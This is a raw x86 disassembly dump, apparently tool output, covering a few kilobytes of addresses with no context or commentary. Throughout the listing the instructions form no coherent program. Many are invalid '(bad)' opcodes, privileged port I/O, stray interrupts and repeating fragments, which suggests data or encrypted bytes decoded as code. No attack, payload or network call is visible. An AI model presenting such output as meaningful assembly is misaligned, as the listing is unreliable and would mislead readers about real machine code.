  424322:	in     eax,dx
  424323:	int    0x76
  424325:	dec    esp
  424326:	int    0x1
  424328:	adc    DWORD PTR [ecx+0x718080],eax
  42432e:	xor    ch,cl
  424330:	jbe    0x42437e
  424332:	add    dh,dl
  424334:	in     eax,dx
  424335:	int    0x1
  424337:	adc    DWORD PTR [ecx+0x70008080],eax
  42433d:	dec    esp
  42433e:	leave  
  42433f:	jbe    0x4242e6
  424341:	pop    DWORD PTR [ebp*1-0x5a89368a]
  424348:	dec    edx
  424349:	pop    ss
  42434a:	xchg   BYTE PTR ds:0xcdfd8dcd,dh
  424350:	xchg   esi,eax
  424351:	std    
  424352:	cmp    ecx,DWORD PTR [edi]
  424354:	cmp    ebx,ecx
  424356:	shr    ebx,cl
  424358:	xchg   edx,eax
  424359:	shr    edx,cl
  42435b:	sub    BYTE PTR [ebx+0x13],dl
  42435e:	or     dh,BYTE PTR [esi-0x4b]
  424361:	inc    ebx
  424362:	jge    0x42433a
  424364:	pop    eax
  424365:	int    0x76
  424367:	stc    
  424368:	int    0x8d
  42436a:	stc    
  42436b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42436e:	lock shl edx,cl
  424371:	sub    bl,dl
  424373:	mov    ebp,0xcdd35392
  424378:	lea    esp,[ebp+0x3ba596cd]
  42437e:	fnstcw WORD PTR [ebx]
  424380:	psrlq  mm5,mm2
  424383:	sub    BYTE PTR [edi+0x4c76cd9d],al
  424389:	int    0x1
  42438b:	adc    DWORD PTR [ecx-0x142c7f80],eax
  424391:	xchg   edx,eax
  424392:	push   ebx
  424393:	jecxz  0x4243c4
  424395:	rcl    ebp,1
  424397:	bound  eax,QWORD PTR [eax]
  424399:	jo     0x4243cf
  42439b:	int    0x76
  42439d:	std    
  42439e:	int    0x8d
  4243a0:	std    
  4243a1:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243a4:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243ab:	push   ebx
  4243ac:	rol    DWORD PTR [ebx+0x76],cl
  4243af:	mov    ch,0xd6
  4243b1:	and    ch,cl
  4243b3:	jbe    0x424352
  4243b5:	int    0x8d
  4243b7:	popf   
  4243b8:	cmp    esi,eax
  4243ba:	cmp    edi,DWORD PTR [ecx-0x2d]
  4243bd:	mov    ebp,0x28f2d392
  4243c2:	push   ebx
  4243c3:	jge    0x424408
  4243c5:	fld    TBYTE PTR [edi]
  4243c7:	pop    es
  4243c8:	xchg   esp,eax
  4243c9:	add    BYTE PTR [eax],al
  4243cb:	add    ch,cl
  4243cd:	jbe    0x4243cc
  4243cf:	int    0x8d
  4243d1:	std    
  4243d2:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243d5:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243dc:	push   ebx
  4243dd:	rol    DWORD PTR [ebx+0x76],cl
  4243e0:	mov    ch,0xd6
  4243e2:	and    ch,cl
  4243e4:	jbe    0x4243df
  4243e6:	int    0x8d
  4243e8:	stc    
  4243e9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243ec:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243f3:	push   ebx
  4243f4:	rol    DWORD PTR [ecx-0x5f14428a],cl
  4243fa:	add    DWORD PTR [eax-0x12893680],0x67f1048e
  424404:	leave  
  424405:	jbe    0x4243fc
  424407:	fdivr  st,st(4)
  424409:	sbb    al,0xb
  42440b:	int    0xa6
  42440d:	std    
  42440e:	int    0x76
  424410:	std    
  424411:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  424417:	xchg   edx,eax
  424418:	shr    DWORD PTR [ebp-0x1462acd8],cl
  42441e:	sbb    al,BYTE PTR [ecx+0x76cd8080]
  424424:	std    
  424425:	int    0x8d
  424427:	std    
  424428:	cmp    edi,DWORD PTR [ecx+0x3b]
  42442b:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424432:	push   ebx
  424433:	ror    DWORD PTR [edx],cl
  424435:	jbe    0x424424
  424437:	int    0x76
  424439:	std    
  42443a:	int    0x8d
  42443c:	std    
  42443d:	cmp    edi,DWORD PTR [ecx+0x3b]
  424440:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424447:	push   ebx
  424448:	ror    DWORD PTR [edx],cl
  42444a:	jbe    0x424441
  42444c:	int    0x8d
  42444e:	std    
  42444f:	int    0x76
  424451:	std    
  424452:	cmp    ecx,DWORD PTR [edi]
  424454:	cmp    ecx,ecx
  424456:	shr    DWORD PTR [ebp-0x6d142cd8],cl
  42445c:	push   ebx
  42445d:	jge    0x42442c
  42445f:	jbe    0x4243f6
  424461:	inc    ebx
  424462:	jge    0x424438
  424464:	xchg   ch,cl
  424466:	test   BYTE PTR ds:0xcded760a,bl
  42446c:	jbe    0x42441b
  42446e:	int    0x84
  424470:	sbb    eax,0xcdf5760a
  424475:	jbe    0x424474
  424477:	int    0x8d
  424479:	std    
  42447a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42447d:	lock shl edx,cl
  424480:	sub    bl,dl
  424482:	mov    ebp,0xcdd35392
  424487:	(bad)  
  424488:	in     eax,dx
  424489:	inc    ebx
  42448a:	rcl    esp,cl
  42448c:	push   esp
  42448d:	int    0x76
  42448f:	std    
  424490:	int    0x8d
  424492:	std    
  424493:	cmp    esi,eax
  424495:	cmp    edi,DWORD PTR [ecx-0x2d]
  424498:	repnz sub bl,dl
  42449b:	mov    ebp,0xcdd35392
  4244a0:	(bad)  
  4244a1:	in     eax,dx
  4244a2:	shr    ebx,cl
  4244a4:	sub    al,BYTE PTR [ebx-0x2d]
  4244a7:	aam    0x1c
  4244a9:	int    0x8d
  4244ab:	in     eax,dx
  4244ac:	int    0x76
  4244ae:	dec    esp
  4244af:	int    0x1
  4244b1:	adc    DWORD PTR [ecx-0x44d07f80],eax
  4244b7:	retf   
  4244b8:	jno    0x4244ba
  4244ba:	(bad)  
  4244bb:	mov    ch,0x0
  4244bd:	jo     0x424447
  4244bf:	in     al,dx
  4244c0:	push   ds
  4244c1:	int    0x76
  4244c3:	cmc    
  4244c4:	xchg   DWORD PTR [esi-0x78],esi
  4244c7:	int    0x8d
  4244c9:	dec    esp
  4244ca:	int    0xa
  4244cc:	adc    DWORD PTR [ecx+0x6d048080],eax
  4244d2:	xchg   edx,eax
  4244d3:	jo     0x4244d5
  4244d5:	(bad)  
  4244d6:	mov    ch,0x0
  4244d8:	jno    0x424462
  4244da:	or     dh,BYTE PTR [esi-0xb]
  4244dd:	int    0x76
  4244df:	std    
  4244e0:	int    0x8d
  4244e2:	std    
  4244e3:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244e6:	lock shl edx,cl
  4244e9:	sub    bl,dl
  4244eb:	mov    ebp,0xcdd35392
  4244f0:	(bad)  
  4244f1:	cmc    
  4244f2:	inc    ebx
  4244f3:	ror    ebp,cl
  4244f5:	jbe    0x4244f0
  4244f7:	int    0x8d
  4244f9:	stc    
  4244fa:	(bad)  
  4244fb:	xor    DWORD PTR [ebx],edi
  4244fd:	jns    0x42453a
  4244ff:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424506:	push   ebx
  424507:	rol    DWORD PTR [ecx+0x1cecbd76],cl
  42450d:	cmp    esi,eax
  42450f:	cmp    edi,DWORD PTR [ecx-0x2d]
  424512:	repnz sub bl,dl
  424515:	mov    ebp,0xcdd35392
  42451a:	(bad)  
  42451b:	cmc    
  42451c:	das    
  42451d:	rcl    ebx,1
  42451f:	int    0x8d
  424521:	lods   eax,DWORD PTR ds:[esi]
  424522:	or     al,BYTE PTR [edi+ebx*1-0x32068933]
  424529:	(bad)  
  42452a:	stc    
  42452b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42452e:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424535:	push   ebx
  424536:	rol    DWORD PTR [edi-0x2893263],cl
  42453c:	int    0x8d
  42453e:	std    
  42453f:	cmp    esi,eax
  424541:	cmp    edi,DWORD PTR [ecx-0x2d]
  424544:	repnz sub bl,dl
  424547:	mov    ebp,0xcdd35392
  42454c:	lea    ebp,[ebp+0x2f1f845e]
  424552:	push   es
  424553:	or     al,0xff
  424555:	add    BYTE PTR [eax],al
  424557:	int    0x76
  424559:	adc    ebp,ecx
  42455b:	lea    edx,[ecx]
  42455d:	ins    BYTE PTR es:[edi],dx
  42455e:	sar    DWORD PTR [ebp-0x30b330d8],cl
  424564:	test   BYTE PTR [eax-0x2cac7f80],al
  42456a:	int    0x8d
  42456c:	icebp  
  42456d:	push   esi
  42456e:	dec    ecx
  42456f:	and    DWORD PTR [esi-0x2ec14cb],eax
  424575:	add    BYTE PTR [eax],al
  424577:	int    0x76
  424579:	std    
  42457a:	int    0x8d
  42457c:	std    
  42457d:	cmp    edi,DWORD PTR [ecx+0x3b]
  424580:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424587:	push   ebx
  424588:	rcr    DWORD PTR [esi+0x76],cl
  42458b:	mov    ebp,0x76cd88d6
  424590:	stc    
  424591:	int    0x8d
  424593:	stc    
  424594:	in     al,dx
  424595:	xchg   ch,cl
  424597:	jbe    0x424596
  424599:	int    0x8d
  42459b:	std    
  42459c:	cmp    esi,eax
  42459e:	cmp    edi,DWORD PTR [ecx-0x56]
  4245a1:	shl    edx,cl
  4245a3:	sub    bl,dl
  4245a5:	mov    ebp,0xd353a892
  4245aa:	arpl   bx,cx
  4245ac:	ror    BYTE PTR [eax-0x12326980],cl
  4245b2:	add    al,0xed
  4245b4:	xor    al,0xc9
  4245b6:	jbe    0x4245b5
  4245b8:	dec    ecx
  4245b9:	and    DWORD PTR [esi-0x528936cb],eax
  4245bf:	inc    ecx
  4245c0:	and    DWORD PTR [esi+0x4c76cd35],eax
  4245c6:	or     dh,BYTE PTR [esi+0x4c]
  4245c9:	cwde   
  4245ca:	int    0x6d
  4245cc:	int    0x76
  4245ce:	std    
  4245cf:	int    0x96
  4245d1:	std    
  4245d2:	sar    bh,0x5f
  4245d5:	shl    DWORD PTR [ecx],1
  4245d7:	xchg   BYTE PTR ds:0x3ba8d33b,dh
  4245dd:	cdq    
  4245de:	shr    edx,cl
  4245e0:	sub    bl,dl
  4245e2:	mov    ebp,0xcdd25392
  4245e7:	xchg   esi,eax
  4245e8:	mov    BYTE PTR [ebx-0xf],al
  4245eb:	das    
  4245ec:	add    eax,0x80808159
  4245f1:	int    0x76
  4245f3:	mov    ch,cl
  4245f5:	xchg   esi,eax
  4245f6:	mov    BYTE PTR [edi+0xa9a6470],al
  4245fc:	xchg   esi,eax
  4245fd:	cmc    
  4245fe:	leave  
  4245ff:	jbe    0x4245fa
  424601:	popa   
  424602:	and    DWORD PTR [esi-0x68932cb],eax
  424608:	int    0x96
  42460a:	stc    
  42460b:	cmp    ebx,DWORD PTR [ecx+0x3b28ead3]
  424611:	rcl    ebx,cl
  424613:	mov    ebp,0xcdd25392
  424618:	xchg   esi,eax
  424619:	std    
  42461a:	int    0xe6
  42461c:	std    
  42461d:	cmp    esp,ebx
  42461f:	cmp    edi,edi
  424621:	shr    ecx,cl
  424623:	sub    bl,dl
  424625:	repz xchg edx,eax
  424627:	push   ebx
  424628:	fxch   st(5)
  42462a:	out    0xf5,al
  42462c:	pop    esi
  42462d:	xchg   esp,eax
  42462e:	leave  
  42462f:	fsubr  QWORD PTR [edi]
  424631:	add    eax,0x8080816b
  424636:	int    0x96
  424638:	cmc    
  424639:	int    0x76
  42463b:	mov    BYTE PTR [edi-0x7f7fd2f5],al
  424641:	or     ch,0x96
  424644:	mov    ch,cl
  424646:	out    0xf5,al
  424648:	xor    ebx,DWORD PTR [edx-0x21932ac]
  42464e:	pop    ebx
  42464f:	int    0xa6
  424651:	std    
  424652:	cmp    edi,edx
  424654:	cmp    ebp,DWORD PTR [ecx-0x2c6def2d]
  42465a:	in     eax,0x28
  42465c:	push   ebx
  42465d:	cld    
  42465e:	or     dl,BYTE PTR [esi+0x2fd943a5]
  424664:	add    eax,0x8080814f
  424669:	int    0x96
  42466b:	std    
  42466c:	int    0xe6
  42466e:	std    
  42466f:	cmp    esp,ebx
  424671:	cmp    edi,edi
  424673:	shl    ebx,cl
  424675:	xchg   edx,eax
  424676:	shr    ecx,cl
  424678:	sub    BYTE PTR [ebx-0x27],dl
  42467b:	or     dl,BYTE PTR [esi+0x4c76c911]
  424681:	mov    dl,0x21
  424683:	xchg   BYTE PTR ds:0xcdfd96cd,dh
  424689:	out    0xfd,al
  42468b:	cmp    esp,ebx
  42468d:	cmp    edi,edi
  42468f:	shl    ebx,cl
  424691:	xchg   edx,eax
  424692:	shr    ecx,cl
  424694:	sub    BYTE PTR [ebx-0x27],dl
  424697:	jmp    0x42469b
  424699:	add    BYTE PTR [eax-0x2693280],0xcd
  4246a0:	(bad)  
  4246a1:	std    
  4246a2:	add    al,0xf7
  4246a4:	(bad)  
  4246a5:	cmp    esp,ebx
  4246a7:	sar    DWORD PTR [ecx-0x6d0c2cd8],cl
  4246ad:	push   ebx
  4246ae:	cdq    
  4246af:	iret   
  4246b0:	ja     0x4246ab
  4246b2:	jecxz  0x4246a3
  4246b4:	inc    ebx
  4246b5:	cdq    
  4246b6:	das    
  4246b7:	add    al,0x21
  4246b9:	add    BYTE PTR [eax-0x3004cc80],0xe4
  4246c0:	jo     0x42464a
  4246c2:	or     dl,dh
  4246c4:	mov    ch,0x2f
  4246c6:	mov    ebx,0xea121a
  4246cb:	das    
  4246cc:	add    BYTE PTR [eax-0x321269f6],0x96
  4246d3:	in     eax,dx
  4246d4:	xchg   DWORD PTR [eax],esi
  4246d6:	int    0xd6
  4246d8:	in     eax,dx
  4246d9:	xchg   DWORD PTR [eax-0x2d],edx
  4246dc:	repz sub bl,dl
  4246df:	mov    ecx,0x2ffb5392
  4246e4:	mov    ebx,0x4cf3d31a
  4246e9:	adc    dh,bh
  4246eb:	dec    ecx
  4246ec:	and    DWORD PTR [esi-0x1229f5cb],eax
  4246f2:	or     dl,BYTE PTR [esi-0x12693243]
  4246f8:	int    0xd6
  4246fa:	in     eax,dx
  4246fb:	cmp    esp,ebx
  4246fd:	add    al,0xf7
  4246ff:	call   ebx
  424701:	repz xchg edx,eax
  424703:	sar    DWORD PTR [ecx-0x7866acd8],cl
  424709:	xchg   esi,eax
  42470a:	mov    BYTE PTR [edx],cl
  42470c:	xchg   esi,eax
  42470d:	in     eax,dx
  42470e:	int    0x96
  424710:	dec    esp
  424711:	int    0xd6
  424713:	dec    esp
  424714:	cmp    esp,ebx
  424716:	add    al,0xf7
  424718:	call   ebx
  42471a:	mov    ecx,0x92f3d328
  42471f:	push   ebx
  424720:	cdq    
  424721:	int    0xd6
  424723:	mov    ebp,0x32d6fb43
  424728:	int    0x96
  42472a:	dec    esp
  42472b:	int    0xd6
  42472d:	dec    esp
  42472e:	cmp    esp,ebx
  424730:	add    al,0xf7
  424732:	call   ebx
  424734:	mov    ecx,0x92f3d328
  424739:	push   ebx
  42473a:	cdq    
  42473b:	int    0xd6
  42473d:	mov    ebp,0x88d6fb43
  424742:	int    0x96
  424744:	in     eax,dx
  424745:	int    0xd6
  424747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424748:	add    DWORD PTR [edx+0x4],0x8d0092c9
  42474f:	mov    ch,0x2f
  424751:	push   es
  424752:	xchg   ebx,eax
  424753:	add    BYTE PTR [eax],al
  424755:	add    BYTE PTR [ecx-0x6932ee5a],al
  42475b:	stc    
  42475c:	int    0xd6
  42475e:	stc    
  42475f:	cmp    esp,ebx
  424761:	add    al,0xf7
  424763:	call   ebx
  424765:	mov    ecx,0x92f3d328
  42476a:	push   ebx
  42476b:	cdq    
  42476c:	int    0xd6
  42476e:	adc    ebp,ecx
  424770:	out    0xf5,al
  424772:	inc    ebx
  424773:	aam    0xd9
  424775:	in     al,0x77
  424777:	sub    al,0xcd
  424779:	xchg   esi,eax
  42477a:	std    
  42477b:	int    0xd6
  42477d:	std    
  42477e:	cmp    esp,ebx
  424780:	add    al,0xf7
  424782:	call   ebx
  424784:	repz xchg edx,eax
  424786:	sar    DWORD PTR [ecx+0x53c58728],cl
  42478c:	cdq    
  42478d:	int    0x9c
  42478f:	test   BYTE PTR [ebx-0x1e],al
  424792:	das    
  424793:	push   es
  424794:	test   BYTE PTR [eax],al
  424796:	add    BYTE PTR [eax],al
  424798:	arpl   bp,cx
  42479a:	jbe    0x424749
  42479c:	cmp    edx,ebx
  42479e:	int    0x8d
  4247a0:	lods   eax,DWORD PTR ds:[esi]
  4247a1:	add    al,0x2
  4247a3:	jmp    FWORD PTR [edx+0x76cd4aec]
  4247a9:	std    
  4247aa:	cmp    edx,ebx
  4247ac:	int    0x8d
  4247ae:	std    
  4247af:	cmp    ecx,DWORD PTR [edi]
  4247b1:	shl    edx,cl
  4247b3:	sub    bl,dl
  4247b5:	mov    ebp,0xa8d35392
  4247ba:	retf   
  4247bb:	ror    BYTE PTR [eax-0x12326980],cl
  4247c1:	adc    ch,ch
  4247c3:	xchg   ebp,eax
  4247c4:	add    BYTE PTR [eax-0x2893680],0x49
  4247cb:	and    DWORD PTR [esi-0x68936cb],eax
  4247d1:	inc    ecx
  4247d2:	and    DWORD PTR [esi-0x28932cb],eax
  4247d8:	int    0x8d
  4247da:	std    
  4247db:	cwde   
  4247dc:	call   0x8621:0xd169ffc0
  4247e3:	xor    eax,0xbdd3793b
  4247e8:	xchg   edx,eax
  4247e9:	mov    al,ds:0xf2d3133b
  4247ee:	sub    BYTE PTR [ebx-0x2d],dl
  4247f1:	or     dh,BYTE PTR [esi-0x53]
  4247f4:	int    0x76
  4247f6:	std    
  4247f7:	int    0x8d
  4247f9:	std    
  4247fa:	cmp    edi,DWORD PTR [ecx-0x2d]
  4247fd:	mov    ebp,0xd3133b92
  424802:	repnz sub BYTE PTR [ebx-0x2d],dl
  424806:	or     dh,BYTE PTR [esi-0xf]
  424809:	int    0xe6
  42480b:	and    al,0xcd
  42480d:	jbe    0x4247fc
  42480f:	int    0x8d
  424811:	in     eax,dx
  424812:	cmp    edx,ebx
  424814:	or     dh,BYTE PTR [esi-0x13]
  424817:	adc    dh,BYTE PTR [esi-0x13]
  42481a:	dec    ecx
  42481b:	mov    al,ds:0x76cd3586
  424820:	cmc    
  424821:	int    0x8d
  424823:	cmc    
  424824:	cmp    edx,ebx
  424826:	or     dh,BYTE PTR [esi-0xb]
  424829:	adc    dh,BYTE PTR [esi-0xb]
  42482c:	dec    ecx
  42482d:	lahf   
  42482e:	xchg   BYTE PTR ds:0xcd1176cd,dh
  424834:	lea    edx,[ecx]
  424836:	cmp    edx,ebx
  424838:	or     dh,BYTE PTR [esi+0x11]
  42483b:	adc    dh,BYTE PTR [esi+0x11]
  42483e:	imul   esp,DWORD PTR [ecx],0x76cd3586
  424844:	mov    ch,0xcd
  424846:	lea    esi,[ebp+0x760ad33b]
  42484c:	mov    ch,0x12
  42484e:	jbe    0x424805
  424850:	dec    ecx
  424851:	and    DWORD PTR [ebp+esi*1+0x212476c9],eax
  424858:	hlt    
  424859:	mov    esi,DWORD PTR ds:0x68876cd
  42485f:	ins    DWORD PTR es:[edi],dx
  424860:	das    
  424861:	add    eax,0x80808551
  424866:	int    0x76
  424868:	dec    esp
  424869:	push   es
  42486a:	ins    DWORD PTR es:[edi],dx
  42486b:	das    
  42486c:	add    eax,0x80808538
  424871:	int    0x76
  424873:	sbb    al,0x6
  424875:	ins    DWORD PTR es:[edi],dx
  424876:	das    
  424877:	add    eax,0x80808523
  42487c:	int    0x76
  42487e:	and    al,0xcd
  424880:	jbe    0x4248a6
  424882:	int    0x8d
  424884:	mov    bl,dl
  424886:	mov    ebp,0x39af5692
  42488b:	add    BYTE PTR [eax+0x2f815eb8],0x6
  424892:	add    DWORD PTR [ebp+0x76cd8080],0xfd8dcdfd
  42489c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42489f:	mov    ebp,0xd3133b92
  4248a4:	repnz sub BYTE PTR [ebx-0x2d],dl
  4248a8:	or     dh,BYTE PTR [esi-0xf]
  4248ab:	int    0x76
  4248ad:	std    
  4248ae:	int    0x76
  4248b0:	std    
  4248b1:	int    0x76
  4248b3:	mov    ch,cl
  4248b5:	lea    ecx,[eax-0x329b8379]
  4248bb:	outs   dx,BYTE PTR ds:[esi]
  4248bc:	jo     0x4248c8
  4248be:	lea    esp,[esi+eax*1]
  4248c1:	ins    DWORD PTR es:[edi],dx
  4248c2:	das    
  4248c3:	add    eax,0x808084f0
  4248c8:	leave  
  4248c9:	jbe    0x424860
  4248cb:	dec    ecx
  4248cc:	and    DWORD PTR [eax+0x35],edi
  4248cf:	int    0x76
  4248d1:	xchg   ebp,eax
  4248d2:	pop    ebx
  4248d3:	int    0xa6
  4248d5:	xchg   ebp,eax
  4248d6:	cmp    edi,DWORD PTR [ecx+0x3b]
  4248d9:	loop   0x4248ae
  4248db:	mov    ebp,0x28e5d392
  4248e0:	push   ebx
  4248e1:	popf   
  4248e2:	or     ah,BYTE PTR [esi-0x289326b]
  4248e8:	int    0x76
  4248ea:	std    
  4248eb:	int    0x8
  4248ed:	sub    eax,0xcd808081
  4248f2:	xor    ch,cl
  4248f4:	bound  esp,QWORD PTR [edi+eax*4+0x30]
  4248f8:	int    0x76
  4248fa:	std    
  4248fb:	int    0x76
  4248fd:	std    
  4248fe:	int    0x8
  424900:	and    eax,0xcd808081
  424905:	sbb    al,0xa
  424907:	xchg   esi,eax
  424908:	dec    esp
  424909:	inc    ebx
  42490a:	fst    st(6)
  42490c:	push   0xffffffcd
  42490e:	(bad)  
  42490f:	cmc    
  424910:	int    0x8
  424912:	adc    DWORD PTR [ecx-0x69307f80],eax
  424918:	lods   eax,DWORD PTR ds:[esi]
  424919:	(bad)  
  42491a:	int    0x96
  42491c:	cmc    
  42491d:	cmp    ecx,DWORD PTR [edi]
  42491f:	add    al,0xfb
  424921:	call   ebx
  424923:	jmp    0x4248b7
  424925:	shr    edx,cl
  424927:	sub    BYTE PTR [ebx-0x1d],dl
  42492a:	int    0x8d
  42492c:	dec    esp
  42492d:	bound  eax,QWORD PTR [eax]
  42492f:	xchg   ecx,eax
  424930:	jo     0x42498d
  424932:	add    BYTE PTR [eax+0x24],dh
  424935:	int    0x8d
  424937:	dec    esp
  424938:	int    0x6e
  42493a:	xchg   esp,eax
  42493b:	int    0x7e
  42493d:	jo     0x424972
  42493f:	jge    0x4249b2
  424941:	xchg   ebp,eax
  424943:	jo     0x424902
  424945:	dec    esi
  424946:	xchg   BYTE PTR [eax+0x248dcd80],al
  42494c:	int    0x8
  42494e:	xor    eax,0xa808081
  424953:	sbb    al,0x0
  424955:	xchg   ecx,eax
  424956:	xchg   esp,eax
  424957:	add    dh,dl
  424959:	mov    BYTE PTR [ebx-0x43],bl
  42495c:	or     eax,0xcd808084
  424961:	pop    ebx
  424962:	fs xchg ebp,edx
  424965:	das    
  424966:	mov    ebx,0x74cf1452
  42496b:	xor    BYTE PTR [edx+ecx*1],bl
  42496e:	jbe    0x42498c
  424970:	int    0x76
  424972:	std    
  424973:	int    0x8d
  424975:	std    
  424976:	cmp    edi,DWORD PTR [ecx+0x4]
  424979:	add    bh,bh
  42497b:	shl    edx,cl
  42497d:	sub    bl,dl
  42497f:	mov    ebp,0x2fd35392
  424984:	mov    ebx,0x960a868a
  424989:	and    al,0x43
  42498b:	jge    0x4249bc
  42498d:	add    eax,0x808080e9
  424992:	int    0x76
  424994:	std    
  424995:	int    0x8d
  424997:	std    
  424998:	cmp    edi,DWORD PTR [ecx+0x4]
  42499b:	add    bh,bh
  42499d:	shl    edx,cl
  42499f:	sub    bl,dl
  4249a1:	mov    ebp,0xad35392
  4249a6:	jbe    0x42494d
  4249a8:	int    0x76
  4249aa:	stc    
  4249ab:	int    0x8d
  4249ad:	stc    
  4249ae:	add    al,0x2
  4249b0:	(bad)  
  4249b1:	cmp    edi,DWORD PTR [ecx-0x2d]
  4249b4:	repnz sub bl,dl
  4249b7:	mov    ebp,0x2fd35392
  4249bc:	mov    ebx,0x7d33868a
  4249c1:	pop    esi
  4249c2:	lea    esp,[ebp-0x7f2ef7d1]
  4249c8:	add    BYTE PTR [eax+0x41c8dcd],0xd3
  4249cf:	mov    BYTE PTR [edx],cl
  4249d1:	lea    ebx,[esp+ebp*8]
  4249d4:	xchg   ebp,ecx
  4249d6:	lea    ebx,[ecx*8+0x31cd5c52]
  4249dd:	or     dh,BYTE PTR [esi-0x63]
  4249e0:	jl     0x4249e8
  4249e2:	icebp  
  4249e3:	aam    0x89
  4249e5:	clc    
  4249e6:	icebp  
  4249e7:	sub    edx,edx
  4249e9:	xchg   DWORD PTR [esi-0x63],esi
  4249ec:	in     al,dx
  4249ed:	xchg   edx,eax
  4249ee:	int    0xd2
  4249f0:	jo     0x4249bf
  4249f2:	outs   dx,BYTE PTR ds:[esi]
  4249f3:	test   BYTE PTR [edi+0x63bd70c5],al
  4249f9:	test   DWORD PTR [eax+0x1c76cd80],eax
  4249ff:	int    0x7c
  424a01:	mov    BYTE PTR [edx],cl
  424a03:	lea    ebx,[ebp-0x32027233]
  424a09:	xchg   esi,eax
  424a0a:	std    
  424a0b:	cmp    ecx,DWORD PTR [edi]
  424a0d:	add    al,0xfb
  424a0f:	call   ebx
  424a11:	jmp    0x4249a5
  424a13:	shr    edx,cl
  424a15:	sub    BYTE PTR [ebx+0x13],dl
  424a18:	pop    esi
  424a19:	lea    ebx,[ebp-0x7232e32c]
  424a1f:	mov    BYTE PTR [edi-0x29ffb384],al
  424a25:	popf   
  424a26:	int    0x6c
  424a28:	test   BYTE PTR [ecx-0x79],dh
  424a2b:	lds    esi,FWORD PTR [eax-0x43]
  424a2e:	add    eax,DWORD PTR [edi+0x76cd8080]
  424a34:	sbb    al,0xcd
  424a36:	(bad)  
  424a37:	stc    
  424a38:	int    0x96
  424a3a:	stc    
  424a3b:	cmp    ecx,DWORD PTR [edi]
  424a3d:	shr    ebx,cl
  424a3f:	xchg   edx,eax
  424a40:	add    al,0xfb
  424a42:	inc    DWORD PTR [ebp*2+0x28ead33c]
  424a49:	push   ebx
  424a4a:	adc    eax,DWORD PTR [ecx-0x69325a73]
  424a50:	and    al,0xa
  424a52:	jbe    0x424a70
  424a54:	int    0x76
  424a56:	stc    
  424a57:	int    0x8d
  424a59:	stc    
  424a5a:	add    al,0x2
  424a5c:	(bad)  
  424a5d:	cmp    edi,DWORD PTR [ecx-0x2d]
  424a60:	repnz sub bl,dl
  424a63:	mov    ebp,0xcdd35392
  424a68:	lea    esp,[edi+ebp*1]
  424a6b:	mov    ebx,0x7d33867e
  424a70:	pop    esi
  424a71:	lea    esp,[ebp+0xa4072f]
  424a77:	add    BYTE PTR [eax],al
  424a79:	int    0x8
  424a7b:	and    eax,0x43808081
  424a80:	sbb    al,0xd6
  424a82:	cmp    ecx,ebp
  424a84:	lea    edx,[ecx]
  424a86:	int    0x8
  424a88:	adc    DWORD PTR [ecx-0x69307f80],eax
  424a8e:	lods   eax,DWORD PTR ds:[esi]
  424a8f:	(bad)  
  424a90:	int    0x96
  424a92:	adc    DWORD PTR [ebx],edi
  424a94:	(bad)  
  424a96:	sti    
  424a97:	call   ebx
  424a99:	jmp    0x424a2d
  424a9b:	shr    edx,cl
  424a9d:	sub    BYTE PTR [ebx-0x1d],dl
  424aa0:	int    0x8d
  424aa2:	dec    esp
  424aa3:	bound  eax,QWORD PTR [eax]
  424aa5:	xchg   ecx,eax
  424aa6:	xchg   esp,eax
  424aa7:	pop    ebx
  424aa8:	add    BYTE PTR [eax+0x24],dh
  424aab:	push   es
  424aac:	ins    DWORD PTR es:[edi],dx
  424aad:	das    
  424aae:	add    eax,0x808092d9
  424ab3:	int    0x96
  424ab5:	and    al,0xcd
  424ab7:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424abd:	or     ch,0x7d
  424ac0:	cmp    ecx,DWORD PTR [edi]
  424ac2:	add    al,0x11
  424ac4:	call   ebx
  424ac6:	jmp    0x424a5a
  424ac8:	shr    DWORD PTR [ebp+0x2f7d5328],cl
  424ace:	add    eax,0x808081da
  424ad3:	int    0x76
  424ad5:	std    
  424ad6:	int    0x8d
  424ad8:	std    
  424ad9:	cmp    edi,DWORD PTR [ecx+0x4]
  424adc:	add    bh,bh
  424ade:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424ae4:	push   ebx
  424ae5:	ror    DWORD PTR [edx],cl
  424ae7:	jbe    0x424aa6
  424ae9:	pop    ebp
  424aea:	push   0xcf35869f
  424aef:	jl     0x424a9e
  424af1:	or     cl,BYTE PTR [ebp+0x658d0a5d]
  424af7:	leave  
  424af8:	jbe    0x424b3f
  424afa:	sbb    BYTE PTR [edi+0x76c93586],bl
  424b00:	shr    al,1
  424b02:	lahf   
  424b03:	xchg   BYTE PTR ds:0xc955760a,dh
  424b09:	jbe    0x424b78
  424b0b:	dec    ecx
  424b0c:	and    DWORD PTR [esi-0x3234c4cb],eax
  424b12:	xchg   esp,eax
  424b13:	iret   
  424b14:	inc    ebp
  424b15:	shl    ebx,cl
  424b17:	xchg   edx,eax
  424b18:	adc    bh,bl
  424b1a:	scas   eax,DWORD PTR es:[edi]
  424b1b:	cmp    DWORD PTR [eax+0x150ab880],eax
  424b21:	lea    esi,[eax+eax*1+0x0]
  424b25:	add    BYTE PTR [esi+0x4],ch
  424b28:	cli    
  424b29:	xchg   BYTE PTR [edx-0x6047a019],al
  424b2f:	xchg   BYTE PTR ds:0x94060a,dh
  424b35:	add    BYTE PTR [eax],al
  424b37:	or     al,BYTE PTR [esi]
  424b39:	mov    esp,0xa000000
  424b3e:	jbe    0x424af0
  424b40:	or     dh,BYTE PTR [esi+0x15]
  424b43:	iret   
  424b44:	outs   dx,BYTE PTR ds:[esi]
  424b45:	std    
  424b46:	iret   
  424b47:	jno    0x424bb9
